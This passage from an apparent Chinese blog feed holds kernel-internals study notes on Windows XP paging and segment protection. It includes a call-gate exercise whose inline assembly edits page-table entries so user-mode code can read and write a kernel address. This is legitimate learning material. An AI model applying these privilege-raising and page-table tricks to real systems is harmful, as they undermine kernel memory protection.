class="number">80</span>h		</span><br><span class="line">.text:<span class="number">0043</span>C95D                 <span class="keyword">and</span>     edx, edi		<span class="comment">//取PS位[7]，判断大小页</span></span><br><span class="line">.text:<span class="number">0043</span>C95F                 push    <span class="number">0</span></span><br><span class="line">.text:<span class="number">0043</span>C961                 mov     [ebp+var_8], edx</span><br><span class="line">.text:<span class="number">0043</span>C964                 pop     eax		<span class="comment">//eax = 0</span></span><br><span class="line">.text:<span class="number">0043</span>C965                 jz      <span class="keyword">short</span> loc_43C96B	<span class="comment">//and edx,edi与运算后如果结果为0，PS = 0，转到小页处理</span></span><br><span class="line">.text:<span class="number">0043</span>C967                 test    eax, eax</span><br><span class="line">.text:<span class="number">0043</span>C969                 jz      <span class="keyword">short</span> loc_43C9BD	<span class="comment">//判定线性地址在大页，为有效地址，直接返回真，返回1</span></span><br><span class="line">.text:<span class="number">0043</span>C96B</span><br><span class="line">.text:<span class="number">0043</span>C96B loc_43C96B:                             ; CODE XREF: MmIsAddressValid+<span class="number">3</span>D↑j</span><br><span class="line">.text:<span class="number">0043</span>C96B                 shr     ecx, <span class="number">9</span>		<span class="comment">//ecx = VAddr，VAddr&gt;&gt;9</span></span><br><span class="line">							<span class="comment">//0111 1111 1111 1111 1111 1000--011`1 1111 1111`1111 1111 1`000</span></span><br><span class="line">.text:<span class="number">0043</span>C96E                 <span class="keyword">and</span>     ecx, <span class="number">7F</span>FFF8h	<span class="comment">//ecx = PDPTI * 2MB + PDI * 4KB + PTI * 8</span></span><br><span class="line">.text:<span class="number">0043</span>C974                 mov     eax, [ecx<span class="number">-3F</span>FFFFFCh]<span class="comment">//eax = PTE高4字节，C0000004</span></span><br><span class="line">.text:<span class="number">0043</span>C97A                 sub     ecx, <span class="number">40000000</span>h	<span class="comment">//ecx = C0000000 + PDPTI * 2MB + PDI * 4KB + PTI * 8</span></span><br><span class="line">  							<span class="comment">//ecx指向PTE</span></span><br><span class="line">.text:<span class="number">0043</span>C980                 mov     edx, [ecx]	<span class="comment">//edx = PTE低4字节</span></span><br><span class="line">.text:<span class="number">0043</span>C982                 mov     [ebp+var_4], eax</span><br><span class="line">.text:<span class="number">0043</span>C985                 push    ebx</span><br><span class="line">.text:<span class="number">0043</span>C986                 mov     eax, edx		<span class="comment">//eax = edx = PTE低4字节</span></span><br><span class="line">.text:<span class="number">0043</span>C988                 <span class="keyword">xor</span>     ebx, ebx</span><br><span class="line">.text:<span class="number">0043</span>C98A                 <span class="keyword">and</span>     eax, <span class="number">1</span>		<span class="comment">//取PTE的P位</span></span><br><span class="line">.text:<span class="number">0043</span>C98D                 <span class="keyword">or</span>      eax, ebx		<span class="comment">//判断P = 0？</span></span><br><span class="line">.text:<span class="number">0043</span>C98F                 pop     ebx</span><br><span class="line">.text:<span class="number">0043</span>C990                 jz      <span class="keyword">short</span> loc_43C9B9	<span class="comment">//if( p==0)，返回假，返回0</span></span><br><span class="line">.text:<span class="number">0043</span>C992                 <span class="keyword">and</span>     edx, edi		<span class="comment">//判断PTE的PAT = 0？</span></span><br><span class="line">.text:<span class="number">0043</span>C994                 push    <span class="number">0</span></span><br><span class="line">.text:<span class="number">0043</span>C996                 mov     [ebp+var_8], edx</span><br><span class="line">.text:<span class="number">0043</span>C999                 pop     eax</span><br><span class="line">.text:<span class="number">0043</span>C99A                 jz      <span class="keyword">short</span> loc_43C9BD	<span class="comment">//PTE的PAT = 0，返回真，返回1，即有效地址</span></span><br><span class="line">.text:<span class="number">0043</span>C99C                 test    eax, eax</span><br><span class="line">.text:<span class="number">0043</span>C99E                 jnz     <span class="keyword">short</span> loc_43C9BD	<span class="comment">//PAT = 1，以后再分析PAT的意义</span></span><br><span class="line">.text:<span class="number">0043</span>C9A0                 <span class="keyword">and</span>     ecx, esi</span><br><span class="line">.text:<span class="number">0043</span>C9A2                 mov     ecx, [ecx<span class="number">-3F</span>A00000h]</span><br><span class="line">.text:<span class="number">0043</span>C9A8                 mov     eax, <span class="number">81</span>h</span><br><span class="line">.text:<span class="number">0043</span>C9AD                 <span class="keyword">and</span>     ecx, eax</span><br><span class="line">.text:<span class="number">0043</span>C9AF                 <span class="keyword">xor</span>     edx, edx</span><br><span class="line">.text:<span class="number">0043</span>C9B1                 cmp     ecx, eax</span><br><span class="line">.text:<span class="number">0043</span>C9B3                 jnz     <span class="keyword">short</span> loc_43C9BD</span><br><span class="line">.text:<span class="number">0043</span>C9B5                 test    edx, edx</span><br><span class="line">.text:<span class="number">0043</span>C9B7                 jnz     <span class="keyword">short</span> loc_43C9BD</span><br><span class="line">.text:<span class="number">0043</span>C9B9</span><br><span class="line">.text:<span class="number">0043</span>C9B9 loc_43C9B9:                             ; CODE XREF: MmIsAddressValid+<span class="number">2</span>E↑j</span><br><span class="line">.text:<span class="number">0043</span>C9B9                                         ; MmIsAddressValid+<span class="number">68</span>↑j</span><br><span class="line">.text:<span class="number">0043</span>C9B9                 <span class="keyword">xor</span>     al, al		<span class="comment">//eax为返回值</span></span><br><span class="line">.text:<span class="number">0043</span>C9BB                 jmp     <span class="keyword">short</span> loc_43C9BF</span><br><span class="line">.text:<span class="number">0043</span>C9BD ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0043</span>C9BD</span><br><span class="line">.text:<span class="number">0043</span>C9BD loc_43C9BD:                             ; CODE XREF: MmIsAddressValid+<span class="number">41</span>↑j</span><br><span class="line">.text:<span class="number">0043</span>C9BD                                         ; MmIsAddressValid+<span class="number">72</span>↑j ...</span><br><span class="line">.text:<span class="number">0043</span>C9BD                 mov     al, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0043</span>C9BF</span><br><span class="line">.text:<span class="number">0043</span>C9BF loc_43C9BF:                             ; CODE XREF: MmIsAddressValid+<span class="number">93</span>↑j</span><br><span class="line">.text:<span class="number">0043</span>C9BF                 pop     edi</span><br><span class="line">.text:<span class="number">0043</span>C9C0                 pop     esi</span><br><span class="line">.text:<span class="number">0043</span>C9C1                 leave</span><br><span class="line">.text:<span class="number">0043</span>C9C2                 retn    <span class="number">4</span></span><br><span class="line">.text:<span class="number">0043</span>C9C2 MmIsAddressValid endp</span><br><span class="line">.text:<span class="number">0043</span>C9C2</span><br><span class="line">.text:<span class="number">0043</span>C9C2 ; ---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<p>分析结果：</p>
<div class="note danger"><p>2-9-9-12：<br>PDPTI-PDI-PTI-OFFSET                    </p>
<p>公式：<br><strong>PDE &#x3D; 0xc0600000 + (PDPTI*4KB) + (PDI*8)</strong><br><strong>PTE &#x3D; 0xc0000000 + (PDPTI*2MB) + (PDI*4KB) + (PTI*8)</strong>                    </p>
<p>更高效的公式（MmIsAddressValid是这么干的）<br>PDE &#x3D; 0xc0600000 + ((addr &gt;&gt; 18) &amp; 0x3ff8)<br>PTE &#x3D; 0xc0000000 + ((addr &gt;&gt; 9) &amp; 0x7ffff8)</p>
</div>



<h3 id="1-c-练习：代码实现读写高2G地址"><a href="#1-c-练习：代码实现读写高2G地址" class="headerlink" title="1.c 练习：代码实现读写高2G地址"></a>1.c 练习：代码实现读写高2G地址</h3><p>题目：在3环写代码读写线性地址：0x8003f048。</p>
<p>方法：通过构造调用门在0环修改线性地址0x8003f048对应<strong>PDE_U&#x2F;S &#x3D; 1、PTE_U&#x2F;S &#x3D; 1</strong>和<strong>PTE_G &#x3D; 0</strong>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">VOID __declspec(naked) CallGate_RW8003f048()</span><br><span class="line">&#123;</span><br><span class="line">  __asm</span><br><span class="line">  &#123;</span><br><span class="line">    pushad;</span><br><span class="line">    pushfd;</span><br><span class="line">    <span class="comment">//先找PDE</span></span><br><span class="line">    <span class="comment">//int 3;</span></span><br><span class="line">    mov eax,<span class="number">0x8003f048</span>;</span><br><span class="line">    push eax;</span><br><span class="line">    shr eax,<span class="number">18</span>;			<span class="comment">//eax = dwAddr&gt;&gt;18</span></span><br><span class="line">    <span class="keyword">and</span> eax,<span class="number">0x3ff8</span>;		<span class="comment">//eax = (dwAddr&gt;&gt;18) &amp; 0x3ff8 = PDPTI * 4KB + PDI * 8</span></span><br><span class="line">    add eax,<span class="number">0xc0600000</span>;		<span class="comment">//eax = C0600000 + PDPTI * 4KB + PDI * 8</span></span><br><span class="line">    				<span class="comment">//eax 指向PDE</span></span><br><span class="line">    mov esi,eax;</span><br><span class="line">    mov eax,[eax];		<span class="comment">//eax = PDE低4字节</span></span><br><span class="line">    mov ebx,eax;		<span class="comment">//ebx = eax = PDE低4字节</span></span><br><span class="line">    <span class="comment">//再找PTE</span></span><br><span class="line">    pop eax;</span><br><span class="line">    shr eax,<span class="number">9</span>;			<span class="comment">//eax =dwAddr&gt;&gt;9</span></span><br><span class="line">    <span class="keyword">and</span> eax,<span class="number">0x7ffff8</span>;		<span class="comment">//eax = (dwAddr &gt;&gt; 9) &amp; 0x7ffff8 = PDPTI * 2MB + PDI * 4KB + PTI * 8</span></span><br><span class="line">    add eax,<span class="number">0xc0000000</span>;		<span class="comment">//eax = 0xc0000000 + PDPTI * 2MB + PDI * 4KB + PTI * 8</span></span><br><span class="line">    				<span class="comment">//eax指向PTE</span></span><br><span class="line">    mov edi,eax;</span><br><span class="line">    mov eax,[eax];		<span class="comment">//eax = PTE低4字节</span></span><br><span class="line">    mov ecx,eax;		<span class="comment">//ecx = eax = PTE低4字节</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//判断PDE的P位和PS位（省略），PTE P、PAT位（省略）</span></span><br><span class="line">    <span class="comment">//修改PDE、PTE的U/S[2] = 1，修改PTE的G[8] = 0。（如果PDE_PS = 0(小页)，PDE_G位无效）</span></span><br><span class="line">    <span class="keyword">or</span> ebx,<span class="number">0x4</span>;			<span class="comment">//PDE_U/S = 1</span></span><br><span class="line">    <span class="keyword">or</span> ecx,<span class="number">0x4</span>;			<span class="comment">//PTE_U/S = 1</span></span><br><span class="line">    <span class="keyword">and</span> ecx,<span class="number">0xFFFFFEFF</span>;		<span class="comment">//PTE_G = 0</span></span><br><span class="line">    mov [esi],ebx;		<span class="comment">//将修改后的PDE低4字节写回</span></span><br><span class="line">    mov [esi+<span class="number">4</span>],<span class="number">0x0</span>;		<span class="comment">//将修改后的PDE高4字节写回</span></span><br><span class="line">    INVLPG dword ptr ds:[<span class="number">0x8003f048</span>];	<span class="comment">//清空线性地址0x8003f048在TLB的缓存</span></span><br><span class="line">    mov [edi],ecx;		<span class="comment">//将修改后的PTE低4字节写回</span></span><br><span class="line">    mov [edi+<span class="number">4</span>],<span class="number">0x0</span>;		<span class="comment">//将修改后的PTE高4字节写回</span></span><br><span class="line"></span><br><span class="line">    popfd;</span><br><span class="line">    popad;</span><br><span class="line">    retf;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	BYTE CallGate[] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x48</span>,<span class="number">0</span>&#125;;</span><br><span class="line">	PDWORD p = (PDWORD)<span class="number">0x8003f048</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请在windbg执行: eq 8003f048 %04xec00`0008%04x\n&quot;</span>, ((DWORD)CallGate_RW8003f048&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0x0000FFFF</span>,\</span><br><span class="line">         (DWORD)CallGate_RW8003f048 &amp; <span class="number">0xFFFF</span>);</span><br><span class="line">  </span><br><span class="line">	getchar();</span><br><span class="line">	__asm</span><br><span class="line">	  &#123;</span><br><span class="line">		call fword ptr ds:[CallGate];</span><br><span class="line">	  &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;线性地址0x8003f048中的值为：%x\n&quot;</span>,*p);<span class="comment">//读</span></span><br><span class="line">	*p = <span class="number">0x12345678</span>;<span class="comment">//写</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;线性地址0x8003f048中的值为：%x\n&quot;</span>,*p);<span class="comment">//读 </span></span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img data-src="https://s2.loli.net/2022/01/06/7Abuelzoq13pj8K.png" alt="39.png"></p>
<p>注意：代码中如果不使用<code>INVLPG dword ptr ds:[0x8003f048];</code>清空线性地址0x8003f048在TLB缓存的话，<code>eq 8003f048 0040ec00·00081005</code>修改后到VC6中第一次运行时报错不能读写高2G内存（可不要退出程序再按F5继续执行即可成功），如果使用INVLPG清空0x8003f048在TLB缓存，则可直接运行成功。</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>保护模式</category>
        <category>Windows内核</category>
      </categories>
      <tags>
        <tag>WinXP内核</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows XP 段保护（二）</title>
    <url>/post/WinXP-ProtectionMode-Segment2/</url>
    <content><![CDATA[<p>ʕ •ᴥ•ʔ  ɔ: </p>
<span id="more"></span>

<h2 id="1-段权限检查"><a href="#1-段权限检查" class="headerlink" title="1 段权限检查"></a>1 段权限检查</h2><ol>
<li><strong>根据段选择子找到段描述符之后，将段描述符加载到段寄存器之前会进行权限检查</strong>（是否将该段描述符加载到段寄存器中）。</li>
<li>Windows没有使用R1、R2</li>
<li>CS、SS段寄存器的低2位存储的就是CPL（RPL是段选择子的低2位，CPL特指CS、SS低2位），当前程序的特权级别。Windows中只能为0x00或0x11</li>
</ol>
<p>G位：决定limit的大小</p>
<ul>
<li>1：limit &#x3D; <strong>0xFFFFFFFF</strong></li>
<li>0：limit &#x3D;<strong>0xFFFFF</strong></li>
</ul>
<p>D&#x2F;B位：地址空间的大小</p>
<ul>
<li>1：4GB（<strong>FFFFFFFF</strong>）</li>
<li>0：64K（<strong>FFFF</strong>）</li>
</ul>
<div class="note danger"><p>RPL：段选择子的权限（我以什么样的特权去访问你）<br>DPL：段的权限（你要访问我，你应该具有什么特权）<br>CPL：CPU当前的权限级别（CPL特指CS、SS低2位）</p>
</div>

<p>数据段（DS）的权限检查和CS、SS段不同。</p>
<h3 id="1-1-段权限检查"><a href="#1-1-段权限检查" class="headerlink" title="1.1 段权限检查"></a>1.1 段权限检查</h3><p>段权限检查步骤：</p>
<p>1、段选择子拆分</p>
<p>2、查表得到段描述符</p>
<p>3、权限检查</p>
<p>4、加载段描述符到段寄存器</p>
<p>5、代码执行EIP</p>
<div class="note primary"><p><strong>数据段权限检查</strong>（满足条件，才能成功访问数据段。）：</p>
<p>CPL &lt;&#x3D; DPL 并且 RPL &lt;&#x3D; DPL (数值上的比较)</p>
<p><strong>代码段权限检查：</strong></p>
<ul>
<li>非一致代码段：CPL &#x3D; DPL 并且 RPL &lt;&#x3D; DPL</li>
<li>一致代码段：CPL &gt;&#x3D; DPL</li>
</ul>
</div>

<h3 id="1-2-练习"><a href="#1-2-练习" class="headerlink" title="1.2 练习"></a>1.2 练习</h3><p>&lt;1&gt; 在3环能加载的数据段有哪些？<br>3环CPL&#x3D;3，只能加载DPL&#x3D;3的数据段。</p>
<p>&lt;2&gt; 在0环能加载的数据段有哪些？<br>0环CPL&#x3D;0，满足RPL&lt;&#x3D;DPL的数据段都可以加载。</p>
<p>&lt;3&gt; 详细描述这下面代码的执行过程：<br>mov ax,0x23<br>mov ds,ax<br>段选择子是0x0023，RPL&#x3D;11b&#x3D;3，属于最低权限，只能访问DPL&#x3D;3的数据段。而CPL则无影响，不管是0环还是3环，都满足CPL&lt;&#x3D;RPL，只要RPL满足，CPL也一定满足。</p>
<p>当执行 mov ds,ax 时，CPU先解析段选择子0023，然后去GDT表找段描述符，检查段描述符P位是否有效，然后检查S位，确认是数据段或代码段，然后检查TYPE域确认是数据段，然后看DPL是否等于3.只要上述条件都满足，则mov指令执行成功，只要有一条不满足，mov失败。</p>
<h2 id="2-断间跳转JMP-FAR"><a href="#2-断间跳转JMP-FAR" class="headerlink" title="2 断间跳转JMP FAR"></a>2 断间跳转JMP FAR</h2><p><strong>3环执行JMP FAR并不能提权（CPL不改变）。</strong></p>
<p>可参看：<a href="https://blog.csdn.net/Kwansy/article/details/108813337">《（8）JMP FAR段间跳转》</a>、<a href="https://www.anquanke.com/post/id/258060#h2-0">《深耕保护模式（二）》</a></p>
<p>要点回顾：</p>
<p>段寄存器：ES、CS、SS、DS、FS、GS、LDTR、TR<br>段寄存器读写：除CS外，其他的段寄存器都可以通过MOV,LES,LSS,LDS,LFS,LGS,LTR（仅在0环之行）指令进行修改。</p>
<p><strong>CS为什么不可以直接修改呢？</strong></p>
<p>CS为代码段，CS的改变意味着EIP的改变，改变CS的同时必须修改EIP和SS，SS改变就必须修改堆栈，所以我们无法使用上面的指令来进行修改。</p>
<p>段间跳转，有两种情况，即要跳转的段是一致代码段还是非一致代码段（参见代码段type域）。</p>
<div class="note warning"><p><strong>同时修改CS与EIP的指令：</strong></p>
<p>JMP FAR &#x2F; CALL FAR &#x2F; RETF &#x2F; INT &#x2F;IRETED</p>
<p><strong>只改变EIP的指令：</strong></p>
<p>JMP &#x2F; CALL &#x2F; JCC &#x2F; RET</p>
</div>

<div class="note danger"><p><strong>一致代码段</strong>：也就是共享的段，要求：CPL &gt;&#x3D; DPL。</p>
<ul>
<li><strong>特权级高的程序不允许访问特权级低的数据</strong>：核心态不允许访问用户态的数据</li>
<li><strong>特权级低的程序可以访问到特权级高的数据</strong>，但特权级不会改变：用户态还是用户态</li>
</ul>
<p><strong>非一致代码段：</strong>普通代码段（Windows使用），要求：CPL &#x3D; DPL 并且 RPL &lt;&#x3D; DPL。</p>
<ul>
<li><strong>只允许同级访问</strong> </li>
<li>绝对禁止不同级别的访问：核心态不是用户态，用户态也不是核心态</li>
</ul>
</div>

<p><strong>代码间的跳转(段间跳转 非调用门之类的) 执行流程</strong></p>
<p>JMP 0x20:0x004183D7 CPU如何执行这行代码？</p>
<p><strong>（1）段选择子拆分</strong></p>
<p>0x20 对应二进制形式 0000 0000 0010 0000</p>
<ul>
<li>RPL &#x3D; 00</li>
<li>TI &#x3D; 0</li>
<li>Index &#x3D; 4</li>
</ul>
<p><strong>（2） 查表得到段描述符</strong></p>
<p>TI &#x3D; 0 所以查GDT表</p>
<p>Index &#x3D; 4 找到对应的段描述符，并不是所有的段描述符都可以跳转。</p>
<p>四种情况可以跳转：<mark class="label warning">代码段、调用门、TSS任务段、任务门</mark>。</p>
<p><strong>（3）权限检查</strong></p>
<p>如果是非一致代码段，要求：CPL &#x3D; DPL 并且 RPL &lt;&#x3D; DPL。</p>
<p>如果是一致代码段，要求：CPL &gt;&#x3D; DPL。</p>
<p>简要说明什么是一致代码段什么是非一致代码段。</p>
<blockquote>
<p>一致代码段又称共享代码段。假设操作系统有一段代码是提供了某些通用功能，这段代码并不会对内核产生影响，并希望这些功能能够被应用层(三环程序)直接使用，即可让一直代码段去修饰这块代码。这也是为什么一致代码段要求：CPL &gt;&#x3D; DPL(当前权限比描述权限低)就可以了。这段代码就是给低权限的应用使用的。</p>
<p>非一致代码段相反，严格控制权限。</p>
</blockquote>
<p><strong>（4）加载段描述符</strong></p>
<p>通过上面的权限检查后，CPU会将段描述符加载到CS段寄存器中.</p>
<p><strong>（5）代码执行</strong></p>
<p>CPU将 CS.Base + Offset 的值写入EIP 然后执行CS:EIP处的代码，段间跳转结束.</p>
<p>注意：直接对代码段进行JMP 或者 CALL的操作，无论目标是一致代码段还是非一致代码段，CPL都不会发生改变.如果要提升CPL的权限，只能通过<strong>调用门</strong>。</p>
<h3 id="2-1-练习：非一致性代码段跳转"><a href="#2-1-练习：非一致性代码段跳转" class="headerlink" title="2.1 练习：非一致性代码段跳转"></a>2.1 练习：非一致性代码段跳转</h3><p>条件：非一致性代码段跳转，只允许同级访问：CPL&#x3D;3的CPU只允许访问DPL&#x3D;3的代码</p>
<p>要求分析：</p>
<p>（1）<strong>CPL&#x3D;DPL&#x3D;0x11，RPL&lt;&#x3D;DPL</strong>，则RPL可为0x00或0x11，TI&#x3D;0，则选择子：0x–000&#x2F;0x–011；</p>
<p>（2）因为要修改CS，所以段描述符的Type域应该是Code —- Type最高位为1，则Type为：0x1xxx；</p>
<p>（3）非一致性代码—-Type次高位为0，则Type为：0x10xx —- &gt;&#x3D;0x8；</p>
<p>（4）P、DPL、S（因为要修改CS，S&#x3D;1）位分别为：0x1111 —- F。</p>
<p><img data-src="https://s2.loli.net/2021/12/16/2s4piJ5AOWluU1n.png" alt="18.png"></p>
<p>段选择子分别为以下两种情况：</p>
<p><strong>本练习以段选择子中RPL &#x3D; 0x11为例</strong></p>
<p>该描述符即指向一个非代码段，我们需要构造一个段选择子来找到该描述符，然后将该段描述符加载到CS寄存器，最后执行跳转。</p>
<p>步骤一：</p>
<p>根据段描述符构造段选择子：</p>
<p>（1）该段描述符为第四个，Index&#x3D;3</p>
<p>（2）TI&#x3D;0（查GDT）</p>
<p>（3）RPL&#x3D;0x11，如果此例RPL&#x3D;0x00，则修改CS时会发生错误。因为非一致性代码跳转不改变CPU权限CPL。</p>
<p>（4）段选择子&#x3D;0x0011 0 11&#x3D;0x1B</p>
<p>（5）Base&#x3D;0，G&#x3D;1则Limit&#x3D;0xFFFFFFFF，则Offset可随意构造</p>
<p>（6）JMP FAR格式：CS:EIP&#x3D;1B:0xxxxxxxx，跳转地址为：CS.Base+Offset</p>
<p>（7）<strong>如果执行成功，应该会修改CS和EIP</strong></p>
<p>步骤二：</p>
<p>打开OD观察此时的CS&#x3D;0x1B、EIP&#x3D;0x00441EC如下图</p>
<p><img data-src="https://s2.loli.net/2021/12/16/lqxMnHeQzXGyvaV.png" alt="19.png"></p>
<p>步骤三：</p>
<p>为了能看到CS变化，则当前的段描述符的位置需要修改，可以将该段描述符复制到0x8003F048处，该处目前为0（P&#x3D;0），如果复制到一个原先P&#x3D;1的段描述符可能会卡死或者蓝屏。</p>
<p><img data-src="https://s2.loli.net/2021/12/16/WX5ozUf4IZx2cr9.png" alt="20.png"></p>
<p>此时段选择子Index&#x3D;9 —- 0x1001 0 11&#x3D;0x4B，在XP中，修改此时的EIP地址处：JMP FAR 004B:0x0044420C，单步F8看CS、EIP变化。</p>
<p><img data-src="https://s2.loli.net/2021/12/16/3YnZtWK2AVzTSi8.png" alt="21.png"></p>
<div class="note default"><p><strong>结论：</strong></p>
<ol>
<li><p>非一致性代码段JMP FAR跳转时，满足段权限检查：CPL&#x3D;DPL&#x3D;0x11，RPL&lt;&#x3D;DPL即能成功。</p>
</li>
<li><p><strong>如果此例RPL&#x3D;0x00，则修改CS时会发生错误。因为JMP FAR不改变CPU权限CPL。</strong></p>
</li>
<li><p>所以3环的非一致性代码跳转成功条件：<strong>CPL&#x3D;DPL&#x3D;0x11，RPL&lt;&#x3D;DPL，RPL&#x3D;0x11</strong>。</p>
</li>
</ol>
</div>

<h3 id="2-2-练习：一致性代码段跳转"><a href="#2-2-练习：一致性代码段跳转" class="headerlink" title="2.2 练习：一致性代码段跳转"></a>2.2 练习：一致性代码段跳转</h3><p>条件：<strong>只允许低权限的程序访问高权限的代码：CPL&#x3D;3的CPU只允许访问DPL&#x3D;0的代码</strong>。</p>
<p>要求：</p>
<p>（1）目前CPL&#x3D;3，则P&#x3D;1，DPL&#x3D;00，S&#x3D;1（因为要修改CS。DATA&#x2F;CODE），1001&#x3D;9</p>
<p>（2）Type：Decimal&#x3D;1（代码段），C&#x3D;1（一致性代码），11xx&gt;&#x3D;0xC，由于此时的的CPL&#x3D;0x11，因为不能修改特权级别，所以RPL必须RPL&#x3D;0x11</p>
<p>（3）构造段选择子0x004B</p>
<p>直接构造一个：00cf<strong>9F</strong>00&#96;0000ffff</p>
<p><img data-src="https://s2.loli.net/2021/12/16/BS6VDfrvMzhk1RH.png" alt="22.png"></p>
<p>重启一下OD，让CS复位如下图。</p>
<p><img data-src="https://s2.loli.net/2021/12/16/WepnhoVQUHCtxDl.png" alt="23.png"></p>
<p>OD中EIP指向的地址构造：JMP FAR 004B:0x0044420D，F8单步看CS、EIP变化。</p>
<p><img data-src="https://s2.loli.net/2021/12/16/TFt1aQp7xCZXIqe.png" alt="24.png"></p>
<div class="note default"><p><strong>结论：</strong></p>
<ol>
<li><p>一致性代码段JMP FAR跳转时，满足段权限检查：CPL&gt;DPL即能成功。</p>
</li>
<li><p><strong>如果此例RPL&#x3D;0x00，则修改CS时会发生错误。因为JMP FAR不改变CPU权限CPL。</strong></p>
</li>
<li><p>所以3环的一致性代码跳转成功条件：<strong>CPL&gt;DPL，RPL&#x3D;0x11</strong>。</p>
</li>
</ol>
</div>

<h3 id="2-3-总结"><a href="#2-3-总结" class="headerlink" title="2.3 总结"></a>2.3 总结</h3><p>1、<strong>为了对数据进行保护，普通代码段是禁止不同级别进行访问的</strong>。用户态的代码不能访问内核的数据，同样，内核态的代码也不能访问用户态的数据.<br>2、如果想提供一些通用的功能，而且这些功能并不会破坏内核数据，那么可以选择一致代码段，这样低级别的程序可以在不提升CPL权限等级的情况下即可以访问.<br>3、如果想访问普通代码段，只有通过“调用门”等提示CPL权限，才能访问。</p>
<h2 id="3-长调用与短调用"><a href="#3-长调用与短调用" class="headerlink" title="3 长调用与短调用"></a>3 长调用与短调用</h2><p>通过JMP FAR可以实现段间的跳转，如果要实现跨段的调用就必须要学习CALL FAR，也就是<mark class="label danger">长调用</mark>。也叫<strong>代码跨段跳转</strong>CALL FAR。</p>
<p>CALL FAR 比JMP FAR要复杂，JMP并不影响堆栈，但CALL指令会影响。</p>
<ul>
<li><strong>JMP FAR</strong>：段间跳转，不能提权。</li>
<li><strong>CALL FAR</strong>：跨段跳转，可以提权。</li>
</ul>
<p>Windows只使用非一致性代码段，没有使用一致性代码段。</p>
<p>CPU提供了<strong>任务</strong>切换，但是Windows没有使用CPU提供的机制，而是自己用操作系统实现了<strong>线程</strong>切换。</p>
<h3 id="3-1-短调用"><a href="#3-1-短调用" class="headerlink" title="3.1 短调用"></a>3.1 短调用</h3><p>指令格式：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">CALL 立即数/寄存器/内存</span><br></pre></td></tr></table></figure>

<p>堆栈变化：</p>
<p><img data-src="https://s2.loli.net/2021/12/17/wiCemuUPQsk3p2I.png" alt="25.png"></p>
<h3 id="3-2-长调用（不提权）"><a href="#3-2-长调用（不提权）" class="headerlink" title="3.2 长调用（不提权）"></a>3.2 长调用（不提权）</h3><p>指令格式：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">CALL CS:EIP(EIP是废弃的)</span><br></pre></td></tr></table></figure>

<p>CALL FAR 和 RETF 一般是成对的，RETF 的执行流程（权限控制）和 CALL FAR 是一样的，所以下面的堆栈图我就不画 RETF 了。</p>
<p>长调用跨段不提权时：<strong>3环跳转到另一个3环代码段，不会切换堆栈</strong>。</p>
<p>发生改变的寄存器：ESP EIP CS</p>
<p><strong>无参数的堆栈变化：</strong></p>
<p><img data-src="https://s2.loli.net/2021/12/17/YEWfJuSzIbpNahO.png" alt="26.png"></p>
<h3 id="3-3-长调用（提权）"><a href="#3-3-长调用（提权）" class="headerlink" title="3.3 长调用（提权）"></a>3.3 长调用（提权）</h3><div class="note info"><p><strong>提权，提的是CS寄存器的低两位CPL，而不是段选择子的低两位RPL。</strong></p>
</div>

<p>指令格式：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">CALL CS:EIP(EIP是废弃的)</span><br></pre></td></tr></table></figure>

<p><strong>提权无参数：</strong></p>
<p><img data-src="https://s2.loli.net/2021/12/17/EnyJMRV9AUi1ulk.png" alt="27.png"></p>
<p><strong>提权有参数：</strong></p>
<p><img data-src="https://s2.loli.net/2021/12/17/iMu7p6VZkBzDjt1.png" alt="28.png"></p>
<ol>
<li>CALL CS:EIP EIP废弃不用，真正要跳转的地方是由段描述符装载进CS后的CS决定。</li>
<li>堆栈的变化：<strong>同一个线程从3环的堆栈切换到0环的堆栈</strong>。</li>
<li>在段描述符加载进CS之前，会将CS保存到堆栈，方便RETF回来时恢复原来的CS。</li>
<li>跨段的意思就是修改CS，不提权：CS段描述符的DPL&#x3D;CPL时，提权：CS段描述符的DPL &lt; CPL时。</li>
<li>RETF回去时也要进行权限检查。</li>
<li><strong>不管提不提权，调用门描述符的DPL&#x3D;0x11，如果不为3那么我们将无法访问到门描述符，敲门的资格都没有。</strong></li>
</ol>
<div class="note primary"><p>长调用的EIP是废弃的，所有信息都根据CS获取，这个CS是段选择子，指向GDT表中的一个特殊的段描述符，这个段描述符叫<strong>调用门</strong>。</p>
<p>Windows中没有使用调用门，需要自己去构造调用门。</p>
</div>

<p>跨段并提权的调用：新的CS、EIP来自段描述符，但是新的R0下的SS、ESP来自TSS（可理解为一块内存）。</p>
<div class="note success"><p><strong>总结</strong>： </p>
<ol>
<li><strong>跨段调用时，一旦有权限切换，就会切换堆栈</strong>（从R3的堆栈切换到R0的堆栈）。</li>
<li>CS的权限一旦改变，SS的权限也要随着改变，CS与SS的等级必须一样。</li>
<li>JMP FAR 只能跳转到同级非一致代码段，但CALL FAR可以通过调用门提权，提升CPL的权限。</li>
</ol>
</div>

<p>SS与ESP从哪里来？参见TSS段。</p>
